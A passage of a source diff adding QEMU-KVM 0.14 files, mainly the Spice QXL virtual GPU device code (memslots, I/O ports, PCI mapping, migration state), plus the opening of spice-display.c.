+    case QXL_RAM_RANGE_INDEX:
+        virt_start = (intptr_t)qemu_get_ram_ptr(d->vga.vram_offset);
+        break;
+    case QXL_VRAM_RANGE_INDEX:
+        virt_start = (intptr_t)qemu_get_ram_ptr(d->vram_offset);
+        break;
+    default:
+        /* should not happen */
+        abort();
+    }
+
+    memslot.slot_id = slot_id;
+    memslot.slot_group_id = MEMSLOT_GROUP_GUEST; /* guest group */
+    memslot.virt_start = virt_start + (guest_start - pci_start);
+    memslot.virt_end   = virt_start + (guest_end   - pci_start);
+    memslot.addr_delta = memslot.virt_start - delta;
+    memslot.generation = d->rom->slot_generation = 0;
+    qxl_rom_set_dirty(d);
+
+    dprint(d, 1, "%s: slot %d: host virt 0x%" PRIx64 " - 0x%" PRIx64 "\n",
+           __FUNCTION__, memslot.slot_id,
+           memslot.virt_start, memslot.virt_end);
+
+    d->ssd.worker->add_memslot(d->ssd.worker, &memslot);
+    d->guest_slots[slot_id].ptr = (void*)memslot.virt_start;
+    d->guest_slots[slot_id].size = memslot.virt_end - memslot.virt_start;
+    d->guest_slots[slot_id].delta = delta;
+    d->guest_slots[slot_id].active = 1;
+}
+
+static void qxl_del_memslot(PCIQXLDevice *d, uint32_t slot_id)
+{
+    dprint(d, 1, "%s: slot %d\n", __FUNCTION__, slot_id);
+    d->ssd.worker->del_memslot(d->ssd.worker, MEMSLOT_GROUP_HOST, slot_id);
+    d->guest_slots[slot_id].active = 0;
+}
+
+static void qxl_reset_memslots(PCIQXLDevice *d)
+{
+    dprint(d, 1, "%s:\n", __FUNCTION__);
+    d->ssd.worker->reset_memslots(d->ssd.worker);
+    memset(&d->guest_slots, 0, sizeof(d->guest_slots));
+}
+
+static void qxl_reset_surfaces(PCIQXLDevice *d)
+{
+    dprint(d, 1, "%s:\n", __FUNCTION__);
+    d->mode = QXL_MODE_UNDEFINED;
+    qemu_mutex_unlock_iothread();
+    d->ssd.worker->destroy_surfaces(d->ssd.worker);
+    qemu_mutex_lock_iothread();
+    memset(&d->guest_surfaces.cmds, 0, sizeof(d->guest_surfaces.cmds));
+}
+
+/* called from spice server thread context only */
+void *qxl_phys2virt(PCIQXLDevice *qxl, QXLPHYSICAL pqxl, int group_id)
+{
+    uint64_t phys   = le64_to_cpu(pqxl);
+    uint32_t slot   = (phys >> (64 -  8)) & 0xff;
+    uint64_t offset = phys & 0xffffffffffff;
+
+    switch (group_id) {
+    case MEMSLOT_GROUP_HOST:
+        return (void*)offset;
+    case MEMSLOT_GROUP_GUEST:
+        PANIC_ON(slot > NUM_MEMSLOTS);
+        PANIC_ON(!qxl->guest_slots[slot].active);
+        PANIC_ON(offset < qxl->guest_slots[slot].delta);
+        offset -= qxl->guest_slots[slot].delta;
+        PANIC_ON(offset > qxl->guest_slots[slot].size)
+        return qxl->guest_slots[slot].ptr + offset;
+    default:
+        PANIC_ON(1);
+    }
+}
+
+static void qxl_create_guest_primary(PCIQXLDevice *qxl, int loadvm)
+{
+    QXLDevSurfaceCreate surface;
+    QXLSurfaceCreate *sc = &qxl->guest_primary.surface;
+
+    assert(qxl->mode != QXL_MODE_NATIVE);
+    qxl_exit_vga_mode(qxl);
+
+    dprint(qxl, 1, "%s: %dx%d\n", __FUNCTION__,
+           le32_to_cpu(sc->width), le32_to_cpu(sc->height));
+
+    surface.format     = le32_to_cpu(sc->format);
+    surface.height     = le32_to_cpu(sc->height);
+    surface.mem        = le64_to_cpu(sc->mem);
+    surface.position   = le32_to_cpu(sc->position);
+    surface.stride     = le32_to_cpu(sc->stride);
+    surface.width      = le32_to_cpu(sc->width);
+    surface.type       = le32_to_cpu(sc->type);
+    surface.flags      = le32_to_cpu(sc->flags);
+
+    surface.mouse_mode = true;
+    surface.group_id   = MEMSLOT_GROUP_GUEST;
+    if (loadvm) {
+        surface.flags |= QXL_SURF_FLAG_KEEP_DATA;
+    }
+
+    qxl->mode = QXL_MODE_NATIVE;
+    qxl->cmdflags = 0;
+    qxl->ssd.worker->create_primary_surface(qxl->ssd.worker, 0, &surface);
+
+    /* for local rendering */
+    qxl_render_resize(qxl);
+}
+
+static void qxl_destroy_primary(PCIQXLDevice *d)
+{
+    if (d->mode == QXL_MODE_UNDEFINED) {
+        return;
+    }
+
+    dprint(d, 1, "%s\n", __FUNCTION__);
+
+    d->mode = QXL_MODE_UNDEFINED;
+    qemu_mutex_unlock_iothread();
+    d->ssd.worker->destroy_primary_surface(d->ssd.worker, 0);
+    qemu_mutex_lock_iothread();
+}
+
+static void qxl_set_mode(PCIQXLDevice *d, int modenr, int loadvm)
+{
+    pcibus_t start = d->pci.io_regions[QXL_RAM_RANGE_INDEX].addr;
+    pcibus_t end   = d->pci.io_regions[QXL_RAM_RANGE_INDEX].size + start;
+    QXLMode *mode = d->modes->modes + modenr;
+    uint64_t devmem = d->pci.io_regions[QXL_RAM_RANGE_INDEX].addr;
+    QXLMemSlot slot = {
+        .mem_start = start,
+        .mem_end = end
+    };
+    QXLSurfaceCreate surface = {
+        .width      = mode->x_res,
+        .height     = mode->y_res,
+        .stride     = -mode->x_res * 4,
+        .format     = SPICE_SURFACE_FMT_32_xRGB,
+        .flags      = loadvm ? QXL_SURF_FLAG_KEEP_DATA : 0,
+        .mouse_mode = true,
+        .mem        = devmem + d->shadow_rom.draw_area_offset,
+    };
+
+    dprint(d, 1, "%s: mode %d  [ %d x %d @ %d bpp devmem 0x%lx ]\n", __FUNCTION__,
+           modenr, mode->x_res, mode->y_res, mode->bits, devmem);
+    if (!loadvm) {
+        qxl_hard_reset(d, 0);
+    }
+
+    d->guest_slots[0].slot = slot;
+    qxl_add_memslot(d, 0, devmem);
+
+    d->guest_primary.surface = surface;
+    qxl_create_guest_primary(d, 0);
+
+    d->mode = QXL_MODE_COMPAT;
+    d->cmdflags = QXL_COMMAND_FLAG_COMPAT;
+#ifdef QXL_COMMAND_FLAG_COMPAT_16BPP /* new in spice 0.6.1 */
+    if (mode->bits == 16) {
+        d->cmdflags |= QXL_COMMAND_FLAG_COMPAT_16BPP;
+    }
+#endif
+    d->shadow_rom.mode = cpu_to_le32(modenr);
+    d->rom->mode = cpu_to_le32(modenr);
+    qxl_rom_set_dirty(d);
+}
+
+static void ioport_write(void *opaque, uint32_t addr, uint32_t val)
+{
+    PCIQXLDevice *d = opaque;
+    uint32_t io_port = addr - d->io_base;
+
+    switch (io_port) {
+    case QXL_IO_RESET:
+    case QXL_IO_SET_MODE:
+    case QXL_IO_MEMSLOT_ADD:
+    case QXL_IO_MEMSLOT_DEL:
+    case QXL_IO_CREATE_PRIMARY:
+        break;
+    default:
+        if (d->mode == QXL_MODE_NATIVE || d->mode == QXL_MODE_COMPAT)
+            break;
+        dprint(d, 1, "%s: unexpected port 0x%x in vga mode\n", __FUNCTION__, io_port);
+        return;
+    }
+
+    switch (io_port) {
+    case QXL_IO_UPDATE_AREA:
+    {
+        QXLRect update = d->ram->update_area;
+        qemu_mutex_unlock_iothread();
+        d->ssd.worker->update_area(d->ssd.worker, d->ram->update_surface,
+                                   &update, NULL, 0, 0);
+        qemu_mutex_lock_iothread();
+        break;
+    }
+    case QXL_IO_NOTIFY_CMD:
+        d->ssd.worker->wakeup(d->ssd.worker);
+        break;
+    case QXL_IO_NOTIFY_CURSOR:
+        d->ssd.worker->wakeup(d->ssd.worker);
+        break;
+    case QXL_IO_UPDATE_IRQ:
+        qxl_set_irq(d);
+        break;
+    case QXL_IO_NOTIFY_OOM:
+        if (!SPICE_RING_IS_EMPTY(&d->ram->release_ring)) {
+            break;
+        }
+        pthread_yield();
+        if (!SPICE_RING_IS_EMPTY(&d->ram->release_ring)) {
+            break;
+        }
+        d->oom_running = 1;
+        d->ssd.worker->oom(d->ssd.worker);
+        d->oom_running = 0;
+        break;
+    case QXL_IO_SET_MODE:
+        dprint(d, 1, "QXL_SET_MODE %d\n", val);
+        qxl_set_mode(d, val, 0);
+        break;
+    case QXL_IO_LOG:
+        if (d->guestdebug) {
+            fprintf(stderr, "qxl/guest: %s", d->ram->log_buf);
+        }
+        break;
+    case QXL_IO_RESET:
+        dprint(d, 1, "QXL_IO_RESET\n");
+        qxl_hard_reset(d, 0);
+        break;
+    case QXL_IO_MEMSLOT_ADD:
+        PANIC_ON(val >= NUM_MEMSLOTS);
+        PANIC_ON(d->guest_slots[val].active);
+        d->guest_slots[val].slot = d->ram->mem_slot;
+        qxl_add_memslot(d, val, 0);
+        break;
+    case QXL_IO_MEMSLOT_DEL:
+        qxl_del_memslot(d, val);
+        break;
+    case QXL_IO_CREATE_PRIMARY:
+        PANIC_ON(val != 0);
+        dprint(d, 1, "QXL_IO_CREATE_PRIMARY\n");
+        d->guest_primary.surface = d->ram->create_surface;
+        qxl_create_guest_primary(d, 0);
+        break;
+    case QXL_IO_DESTROY_PRIMARY:
+        PANIC_ON(val != 0);
+        dprint(d, 1, "QXL_IO_DESTROY_PRIMARY\n");
+        qxl_destroy_primary(d);
+        break;
+    case QXL_IO_DESTROY_SURFACE_WAIT:
+        d->ssd.worker->destroy_surface_wait(d->ssd.worker, val);
+        break;
+    case QXL_IO_DESTROY_ALL_SURFACES:
+        d->ssd.worker->destroy_surfaces(d->ssd.worker);
+        break;
+    default:
+        fprintf(stderr, "%s: ioport=0x%x, abort()\n", __FUNCTION__, io_port);
+        abort();
+    }
+}
+
+static uint32_t ioport_read(void *opaque, uint32_t addr)
+{
+    PCIQXLDevice *d = opaque;
+
+    dprint(d, 1, "%s: unexpected\n", __FUNCTION__);
+    return 0xff;
+}
+
+static void qxl_map(PCIDevice *pci, int region_num,
+                    pcibus_t addr, pcibus_t size, int type)
+{
+    static const char *names[] = {
+        [ QXL_IO_RANGE_INDEX ]   = "ioports",
+        [ QXL_RAM_RANGE_INDEX ]  = "devram",
+        [ QXL_ROM_RANGE_INDEX ]  = "rom",
+        [ QXL_VRAM_RANGE_INDEX ] = "vram",
+    };
+    PCIQXLDevice *qxl = DO_UPCAST(PCIQXLDevice, pci, pci);
+
+    dprint(qxl, 1, "%s: bar %d [%s] addr 0x%lx size 0x%lx\n", __FUNCTION__,
+            region_num, names[region_num], addr, size);
+
+    switch (region_num) {
+    case QXL_IO_RANGE_INDEX:
+        register_ioport_write(addr, size, 1, ioport_write, pci);
+        register_ioport_read(addr, size, 1, ioport_read, pci);
+        qxl->io_base = addr;
+        break;
+    case QXL_RAM_RANGE_INDEX:
+        cpu_register_physical_memory(addr, size, qxl->vga.vram_offset | IO_MEM_RAM);
+        qxl->vga.map_addr = addr;
+        qxl->vga.map_end = addr + size;
+        if (qxl->id == 0) {
+            vga_dirty_log_start(&qxl->vga);
+        }
+        break;
+    case QXL_ROM_RANGE_INDEX:
+        cpu_register_physical_memory(addr, size, qxl->rom_offset | IO_MEM_ROM);
+        break;
+    case QXL_VRAM_RANGE_INDEX:
+        cpu_register_physical_memory(addr, size, qxl->vram_offset | IO_MEM_RAM);
+        break;
+    }
+}
+
+static void pipe_read(void *opaque)
+{
+    PCIQXLDevice *d = opaque;
+    char dummy;
+    int len;
+
+    do {
+        len = read(d->pipe[0], &dummy, sizeof(dummy));
+    } while (len == sizeof(dummy));
+    qxl_set_irq(d);
+}
+
+/* called from spice server thread context only */
+static void qxl_send_events(PCIQXLDevice *d, uint32_t events)
+{
+    uint32_t old_pending;
+    uint32_t le_events = cpu_to_le32(events);
+
+    assert(d->ssd.running);
+    old_pending = __sync_fetch_and_or(&d->ram->int_pending, le_events);
+    if ((old_pending & le_events) == le_events) {
+        return;
+    }
+    if (pthread_self() == d->main) {
+        qxl_set_irq(d);
+    } else {
+        if (write(d->pipe[1], d, 1) != 1) {
+            dprint(d, 1, "%s: write to pipe failed\n", __FUNCTION__);
+        }
+    }
+}
+
+static void init_pipe_signaling(PCIQXLDevice *d)
+{
+   if (pipe(d->pipe) < 0) {
+       dprint(d, 1, "%s: pipe creation failed\n", __FUNCTION__);
+       return;
+   }
+#ifdef CONFIG_IOTHREAD
+   fcntl(d->pipe[0], F_SETFL, O_NONBLOCK);
+#else
+   fcntl(d->pipe[0], F_SETFL, O_NONBLOCK /* | O_ASYNC */);
+#endif
+   fcntl(d->pipe[1], F_SETFL, O_NONBLOCK);
+   fcntl(d->pipe[0], F_SETOWN, getpid());
+
+   d->main = pthread_self();
+   qemu_set_fd_handler(d->pipe[0], pipe_read, NULL, d);
+}
+
+/* graphics console */
+
+static void qxl_hw_update(void *opaque)
+{
+    PCIQXLDevice *qxl = opaque;
+    VGACommonState *vga = &qxl->vga;
+
+    switch (qxl->mode) {
+    case QXL_MODE_VGA:
+        vga->update(vga);
+        break;
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+        qxl_render_update(qxl);
+        break;
+    default:
+        break;
+    }
+}
+
+static void qxl_hw_invalidate(void *opaque)
+{
+    PCIQXLDevice *qxl = opaque;
+    VGACommonState *vga = &qxl->vga;
+
+    vga->invalidate(vga);
+}
+
+static void qxl_hw_screen_dump(void *opaque, const char *filename)
+{
+    PCIQXLDevice *qxl = opaque;
+    VGACommonState *vga = &qxl->vga;
+
+    switch (qxl->mode) {
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+        qxl_render_update(qxl);
+        ppm_save(filename, qxl->ssd.ds->surface);
+        break;
+    case QXL_MODE_VGA:
+        vga->screen_dump(vga, filename);
+        break;
+    default:
+        break;
+    }
+}
+
+static void qxl_hw_text_update(void *opaque, console_ch_t *chardata)
+{
+    PCIQXLDevice *qxl = opaque;
+    VGACommonState *vga = &qxl->vga;
+
+    if (qxl->mode == QXL_MODE_VGA) {
+        vga->text_update(vga, chardata);
+        return;
+    }
+}
+
+static void qxl_vm_change_state_handler(void *opaque, int running, int reason)
+{
+    PCIQXLDevice *qxl = opaque;
+    qemu_spice_vm_change_state_handler(&qxl->ssd, running, reason);
+
+    if (!running && qxl->mode == QXL_MODE_NATIVE) {
+        /* dirty all vram (which holds surfaces) to make sure it is saved */
+        /* FIXME #1: should go out during "live" stage */
+        /* FIXME #2: we only need to save the areas which are actually used */
+        ram_addr_t addr = qxl->vram_offset;
+        qxl_set_dirty(addr, addr + qxl->vram_size);
+    }
+}
+
+/* display change listener */
+
+static void display_update(struct DisplayState *ds, int x, int y, int w, int h)
+{
+    if (qxl0->mode == QXL_MODE_VGA) {
+        qemu_spice_display_update(&qxl0->ssd, x, y, w, h);
+    }
+}
+
+static void display_resize(struct DisplayState *ds)
+{
+    if (qxl0->mode == QXL_MODE_VGA) {
+        qemu_spice_display_resize(&qxl0->ssd);
+    }
+}
+
+static void display_refresh(struct DisplayState *ds)
+{
+    if (qxl0->mode == QXL_MODE_VGA) {
+        qemu_spice_display_refresh(&qxl0->ssd);
+    }
+}
+
+static DisplayChangeListener display_listener = {
+    .dpy_update  = display_update,
+    .dpy_resize  = display_resize,
+    .dpy_refresh = display_refresh,
+};
+
+static int qxl_init_common(PCIQXLDevice *qxl)
+{
+    uint8_t* config = qxl->pci.config;
+    uint32_t pci_device_id;
+    uint32_t pci_device_rev;
+    uint32_t io_size;
+
+    qxl->mode = QXL_MODE_UNDEFINED;
+    qxl->generation = 1;
+    qxl->num_memslots = NUM_MEMSLOTS;
+    qxl->num_surfaces = NUM_SURFACES;
+
+    switch (qxl->revision) {
+    case 1: /* spice 0.4 -- qxl-1 */
+        pci_device_id  = QXL_DEVICE_ID_STABLE;
+        pci_device_rev = QXL_REVISION_STABLE_V04;
+        break;
+    case 2: /* spice 0.6 -- qxl-2 */
+        pci_device_id  = QXL_DEVICE_ID_STABLE;
+        pci_device_rev = QXL_REVISION_STABLE_V06;
+        break;
+    default: /* experimental */
+        pci_device_id  = QXL_DEVICE_ID_DEVEL;
+        pci_device_rev = 1;
+        break;
+    }
+
+    pci_config_set_vendor_id(config, REDHAT_PCI_VENDOR_ID);
+    pci_config_set_device_id(config, pci_device_id);
+    pci_set_byte(&config[PCI_REVISION_ID], pci_device_rev);
+    pci_set_byte(&config[PCI_INTERRUPT_PIN], 1);
+
+    qxl->rom_size = qxl_rom_size();
+    qxl->rom_offset = qemu_ram_alloc(&qxl->pci.qdev, "qxl.vrom", qxl->rom_size);
+    init_qxl_rom(qxl);
+    init_qxl_ram(qxl);
+
+    if (qxl->vram_size < 16 * 1024 * 1024) {
+        qxl->vram_size = 16 * 1024 * 1024;
+    }
+    if (qxl->revision == 1) {
+        qxl->vram_size = 4096;
+    }
+    qxl->vram_size = msb_mask(qxl->vram_size * 2 - 1);
+    qxl->vram_offset = qemu_ram_alloc(&qxl->pci.qdev, "qxl.vram", qxl->vram_size);
+
+    io_size = msb_mask(QXL_IO_RANGE_SIZE * 2 - 1);
+    if (qxl->revision == 1) {
+        io_size = 8;
+    }
+
+    pci_register_bar(&qxl->pci, QXL_IO_RANGE_INDEX,
+                     io_size, PCI_BASE_ADDRESS_SPACE_IO, qxl_map);
+
+    pci_register_bar(&qxl->pci, QXL_ROM_RANGE_INDEX,
+                     qxl->rom_size, PCI_BASE_ADDRESS_SPACE_MEMORY,
+                     qxl_map);
+
+    pci_register_bar(&qxl->pci, QXL_RAM_RANGE_INDEX,
+                     qxl->vga.vram_size, PCI_BASE_ADDRESS_SPACE_MEMORY,
+                     qxl_map);
+
+    pci_register_bar(&qxl->pci, QXL_VRAM_RANGE_INDEX, qxl->vram_size,
+                     PCI_BASE_ADDRESS_SPACE_MEMORY, qxl_map);
+
+    qxl->ssd.qxl.base.sif = &qxl_interface.base;
+    qxl->ssd.qxl.id = qxl->id;
+    qemu_spice_add_interface(&qxl->ssd.qxl.base);
+    qemu_add_vm_change_state_handler(qxl_vm_change_state_handler, qxl);
+
+    init_pipe_signaling(qxl);
+    qxl_reset_state(qxl);
+
+    return 0;
+}
+
+static int qxl_init_primary(PCIDevice *dev)
+{
+    PCIQXLDevice *qxl = DO_UPCAST(PCIQXLDevice, pci, dev);
+    VGACommonState *vga = &qxl->vga;
+    ram_addr_t ram_size = msb_mask(qxl->vga.vram_size * 2 - 1);
+
+    qxl->id = 0;
+
+    if (ram_size < 32 * 1024 * 1024) {
+        ram_size = 32 * 1024 * 1024;
+    }
+    vga_common_init(vga, ram_size);
+    vga_init(vga);
+    register_ioport_write(0x3c0, 16, 1, qxl_vga_ioport_write, vga);
+    register_ioport_write(0x3b4,  2, 1, qxl_vga_ioport_write, vga);
+    register_ioport_write(0x3d4,  2, 1, qxl_vga_ioport_write, vga);
+    register_ioport_write(0x3ba,  1, 1, qxl_vga_ioport_write, vga);
+    register_ioport_write(0x3da,  1, 1, qxl_vga_ioport_write, vga);
+
+    vga->ds = graphic_console_init(qxl_hw_update, qxl_hw_invalidate,
+                                   qxl_hw_screen_dump, qxl_hw_text_update, qxl);
+    qxl->ssd.ds = vga->ds;
+    qxl->ssd.bufsize = (16 * 1024 * 1024);
+    qxl->ssd.buf = qemu_malloc(qxl->ssd.bufsize);
+
+    qxl0 = qxl;
+    register_displaychangelistener(vga->ds, &display_listener);
+
+    pci_config_set_class(dev->config, PCI_CLASS_DISPLAY_VGA);
+    return qxl_init_common(qxl);
+}
+
+static int qxl_init_secondary(PCIDevice *dev)
+{
+    static int device_id = 1;
+    PCIQXLDevice *qxl = DO_UPCAST(PCIQXLDevice, pci, dev);
+    ram_addr_t ram_size = msb_mask(qxl->vga.vram_size * 2 - 1);
+
+    qxl->id = device_id++;
+
+    if (ram_size < 16 * 1024 * 1024) {
+        ram_size = 16 * 1024 * 1024;
+    }
+    qxl->vga.vram_size = ram_size;
+    qxl->vga.vram_offset = qemu_ram_alloc(&qxl->pci.qdev, "qxl.vgavram",
+                                          qxl->vga.vram_size);
+    qxl->vga.vram_ptr = qemu_get_ram_ptr(qxl->vga.vram_offset);
+
+    pci_config_set_class(dev->config, PCI_CLASS_DISPLAY_OTHER);
+    return qxl_init_common(qxl);
+}
+
+static void qxl_pre_save(void *opaque)
+{
+    PCIQXLDevice* d = opaque;
+    uint8_t *ram_start = d->vga.vram_ptr;
+
+    dprint(d, 1, "%s:\n", __FUNCTION__);
+    if (d->last_release == NULL) {
+        d->last_release_offset = 0;
+    } else {
+        d->last_release_offset = (uint8_t *)d->last_release - ram_start;
+    }
+    assert(d->last_release_offset < d->vga.vram_size);
+}
+
+static int qxl_pre_load(void *opaque)
+{
+    PCIQXLDevice* d = opaque;
+
+    dprint(d, 1, "%s: start\n", __FUNCTION__);
+    qxl_hard_reset(d, 1);
+    qxl_exit_vga_mode(d);
+    dprint(d, 1, "%s: done\n", __FUNCTION__);
+    return 0;
+}
+
+static int qxl_post_load(void *opaque, int version)
+{
+    PCIQXLDevice* d = opaque;
+    uint8_t *ram_start = d->vga.vram_ptr;
+    QXLCommandExt *cmds;
+    int in, out, i, newmode;
+
+    dprint(d, 1, "%s: start\n", __FUNCTION__);
+
+    assert(d->last_release_offset < d->vga.vram_size);
+    if (d->last_release_offset == 0) {
+        d->last_release = NULL;
+    } else {
+        d->last_release = (QXLReleaseInfo *)(ram_start + d->last_release_offset);
+    }
+
+    d->modes = (QXLModes*)((uint8_t*)d->rom + d->rom->modes_offset);
+
+    dprint(d, 1, "%s: restore mode\n", __FUNCTION__);
+    newmode = d->mode;
+    d->mode = QXL_MODE_UNDEFINED;
+    switch (newmode) {
+    case QXL_MODE_UNDEFINED:
+        break;
+    case QXL_MODE_VGA:
+        qxl_enter_vga_mode(d);
+        break;
+    case QXL_MODE_NATIVE:
+        for (i = 0; i < NUM_MEMSLOTS; i++) {
+            if (!d->guest_slots[i].active) {
+                continue;
+            }
+            qxl_add_memslot(d, i, 0);
+        }
+        qxl_create_guest_primary(d, 1);
+
+        /* replay surface-create and cursor-set commands */
+        cmds = qemu_mallocz(sizeof(QXLCommandExt) * (NUM_SURFACES + 1));
+        for (in = 0, out = 0; in < NUM_SURFACES; in++) {
+            if (d->guest_surfaces.cmds[in] == 0) {
+                continue;
+            }
+            cmds[out].cmd.data = d->guest_surfaces.cmds[in];
+            cmds[out].cmd.type = QXL_CMD_SURFACE;
+            cmds[out].group_id = MEMSLOT_GROUP_GUEST;
+            out++;
+        }
+        cmds[out].cmd.data = d->guest_cursor;
+        cmds[out].cmd.type = QXL_CMD_CURSOR;
+        cmds[out].group_id = MEMSLOT_GROUP_GUEST;
+        out++;
+        d->ssd.worker->loadvm_commands(d->ssd.worker, cmds, out);
+        qemu_free(cmds);
+
+        break;
+    case QXL_MODE_COMPAT:
+        qxl_set_mode(d, d->shadow_rom.mode, 1);
+        break;
+    }
+    dprint(d, 1, "%s: done\n", __FUNCTION__);
+
+    return 0;
+}
+
+#define QXL_SAVE_VERSION 21
+
+static VMStateDescription qxl_memslot = {
+    .name               = "qxl-memslot",
+    .version_id         = QXL_SAVE_VERSION,
+    .minimum_version_id = QXL_SAVE_VERSION,
+    .fields = (VMStateField[]) {
+        VMSTATE_UINT64(slot.mem_start, struct guest_slots),
+        VMSTATE_UINT64(slot.mem_end,   struct guest_slots),
+        VMSTATE_UINT32(active,         struct guest_slots),
+        VMSTATE_END_OF_LIST()
+    }
+};
+
+static VMStateDescription qxl_surface = {
+    .name               = "qxl-surface",
+    .version_id         = QXL_SAVE_VERSION,
+    .minimum_version_id = QXL_SAVE_VERSION,
+    .fields = (VMStateField[]) {
+        VMSTATE_UINT32(width,      QXLSurfaceCreate),
+        VMSTATE_UINT32(height,     QXLSurfaceCreate),
+        VMSTATE_INT32(stride,      QXLSurfaceCreate),
+        VMSTATE_UINT32(format,     QXLSurfaceCreate),
+        VMSTATE_UINT32(position,   QXLSurfaceCreate),
+        VMSTATE_UINT32(mouse_mode, QXLSurfaceCreate),
+        VMSTATE_UINT32(flags,      QXLSurfaceCreate),
+        VMSTATE_UINT32(type,       QXLSurfaceCreate),
+        VMSTATE_UINT64(mem,        QXLSurfaceCreate),
+        VMSTATE_END_OF_LIST()
+    }
+};
+
+static VMStateDescription qxl_vmstate = {
+    .name               = "qxl",
+    .version_id         = QXL_SAVE_VERSION,
+    .minimum_version_id = QXL_SAVE_VERSION,
+    .pre_save           = qxl_pre_save,
+    .pre_load           = qxl_pre_load,
+    .post_load          = qxl_post_load,
+    .fields = (VMStateField []) {
+        VMSTATE_PCI_DEVICE(pci, PCIQXLDevice),
+        VMSTATE_STRUCT(vga, PCIQXLDevice, 0, vmstate_vga_common, VGACommonState),
+        VMSTATE_UINT32(shadow_rom.mode, PCIQXLDevice),
+        VMSTATE_UINT32(num_free_res, PCIQXLDevice),
+        VMSTATE_UINT32(last_release_offset, PCIQXLDevice),
+        VMSTATE_UINT32(mode, PCIQXLDevice),
+        VMSTATE_UINT32(ssd.unique, PCIQXLDevice),
+        VMSTATE_INT32_EQUAL(num_memslots, PCIQXLDevice),
+        VMSTATE_STRUCT_ARRAY(guest_slots, PCIQXLDevice, NUM_MEMSLOTS, 0,
+                             qxl_memslot, struct guest_slots),
+        VMSTATE_STRUCT(guest_primary.surface, PCIQXLDevice, 0,
+                       qxl_surface, QXLSurfaceCreate),
+        VMSTATE_INT32_EQUAL(num_surfaces, PCIQXLDevice),
+        VMSTATE_ARRAY(guest_surfaces.cmds, PCIQXLDevice, NUM_SURFACES, 0,
+                      vmstate_info_uint64, uint64_t),
+        VMSTATE_UINT64(guest_cursor, PCIQXLDevice),
+        VMSTATE_END_OF_LIST()
+    },
+};
+
+static PCIDeviceInfo qxl_info_primary = {
+    .qdev.name    = "qxl-vga",
+    .qdev.desc    = "Spice QXL GPU (primary, vga compatible)",
+    .qdev.size    = sizeof(PCIQXLDevice),
+    .qdev.reset   = qxl_reset_handler,
+    .qdev.vmsd    = &qxl_vmstate,
+    .no_hotplug   = 1,
+    .init         = qxl_init_primary,
+    .config_write = qxl_write_config,
+    .romfile      = "vgabios-qxl.bin",
+    .qdev.props = (Property[]) {
+        DEFINE_PROP_UINT32("ram_size", PCIQXLDevice, vga.vram_size, 64 * 1024 * 1024),
+        DEFINE_PROP_UINT32("vram_size", PCIQXLDevice, vram_size, 64 * 1024 * 1024),
+        DEFINE_PROP_UINT32("revision", PCIQXLDevice, revision, 2),
+        DEFINE_PROP_UINT32("debug", PCIQXLDevice, debug, 0),
+        DEFINE_PROP_UINT32("guestdebug", PCIQXLDevice, guestdebug, 0),
+        DEFINE_PROP_UINT32("cmdlog", PCIQXLDevice, cmdlog, 0),
+        DEFINE_PROP_END_OF_LIST(),
+    }
+};
+
+static PCIDeviceInfo qxl_info_secondary = {
+    .qdev.name    = "qxl",
+    .qdev.desc    = "Spice QXL GPU (secondary)",
+    .qdev.size    = sizeof(PCIQXLDevice),
+    .qdev.reset   = qxl_reset_handler,
+    .qdev.vmsd    = &qxl_vmstate,
+    .init         = qxl_init_secondary,
+    .qdev.props = (Property[]) {
+        DEFINE_PROP_UINT32("ram_size", PCIQXLDevice, vga.vram_size, 64 * 1024 * 1024),
+        DEFINE_PROP_UINT32("vram_size", PCIQXLDevice, vram_size, 64 * 1024 * 1024),
+        DEFINE_PROP_UINT32("revision", PCIQXLDevice, revision, 2),
+        DEFINE_PROP_UINT32("debug", PCIQXLDevice, debug, 0),
+        DEFINE_PROP_UINT32("guestdebug", PCIQXLDevice, guestdebug, 0),
+        DEFINE_PROP_UINT32("cmdlog", PCIQXLDevice, cmdlog, 0),
+        DEFINE_PROP_END_OF_LIST(),
+    }
+};
+
+static void qxl_register(void)
+{
+    pci_qdev_register(&qxl_info_primary);
+    pci_qdev_register(&qxl_info_secondary);
+}
+
+device_init(qxl_register);
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.c qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.c
--- qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.c	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.c	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,412 @@
+/*
+ * Copyright (C) 2010 Red Hat, Inc.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 or
+ * (at your option) version 3 of the License.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <pthread.h>
+
+#include "qemu-common.h"
+#include "qemu-spice.h"
+#include "qemu-timer.h"
+#include "qemu-queue.h"
+#include "monitor.h"
+#include "console.h"
+#include "sysemu.h"
+
+#include "spice-display.h"
+
+static int debug = 0;
+
+static void GCC_FMT_ATTR(2, 3) dprint(int level, const char *fmt, ...)
+{
+    va_list args;
+
+    if (level <= debug) {
+        va_start(args, fmt);
+        vfprintf(stderr, fmt, args);
+        va_end(args);
+    }
+}
+
+int qemu_spice_rect_is_empty(const QXLRect* r)
+{
+    return r->top == r->bottom || r->left == r->right;
+}
+
+void qemu_spice_rect_union(QXLRect *dest, const QXLRect *r)
+{
+    if (qemu_spice_rect_is_empty(r)) {
+        return;
+    }
+
+    if (qemu_spice_rect_is_empty(dest)) {
+        *dest = *r;
+        return;
+    }
+
+    dest->top = MIN(dest->top, r->top);
+    dest->left = MIN(dest->left, r->left);
+    dest->bottom = MAX(dest->bottom, r->bottom);
+    dest->right = MAX(dest->right, r->right);
+}
+
+/*
+ * Called from spice server thread context (via interface_get_command).
+ *
+ * We must aquire the global qemu mutex here to make sure the
+ * DisplayState (+DisplaySurface) we are accessing doesn't change
+ * underneath us.
+ */
